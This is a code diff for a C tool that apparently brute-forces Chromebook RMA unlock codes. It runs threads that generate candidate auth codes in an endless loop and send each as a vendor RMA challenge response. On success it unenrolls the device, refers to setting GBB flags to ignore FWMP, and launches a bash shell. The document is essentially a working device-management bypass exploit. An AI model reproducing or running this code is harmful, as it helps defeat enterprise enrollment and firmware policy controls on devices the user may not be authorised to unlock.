@@ -42,14 +42,14 @@ static int process_rma(struct transfer_descriptor *td, const char *authcode)
 	response_size = sizeof(rma_response);
 	int32_t temp = send_vendor_command(td, VENDOR_CC_RMA_CHALLENGE_RESPONSE,
 			    authcode, auth_size,
-			    rma_response, &response_size);
+	 		    rma_response, &response_size);
     if (temp == -1){
         return -1;
     }
 	if (response_size == 1) {
 		printf("\nrma unlock failed");
         return -1;
-	}
+    }
 	printf("RMA unlock succeeded.\n");
     return 1;
     
@@ -67,23 +67,25 @@ char generate(char* str){
     str[8] = 0;
 }
 void process(void * td){
+    struct transfer_descriptor newtd = *(struct transfer_descriptor*) td;
     while(1){
         char string[8];
         generate(string);
-        if (process_rma(&td, string) == 1){
+        //printf("%s\n\n",string);
+        if (process_rma(&newtd, string) == 1){
             printf("Auth code found, sleeping for 10 seconds before setting GBB flags to ignore FWMP");
             sleep(10);
             unenroll();
-
             execlp("/bin/bash", "bash", (char *)NULL);
         }
     }
 }
 int main(int argc,char* argv[]){
     int threads;
-    printf("How many threads: \n");
+    //printf("How many threads: \n");
 
-    scanf("%d", &threads);
+    //scanf("%d", &threads);
+    threads = 2;
     if (threads < 1){
         printf("Because you input a value below 1 it was set to 1\n");
         threads = 1;
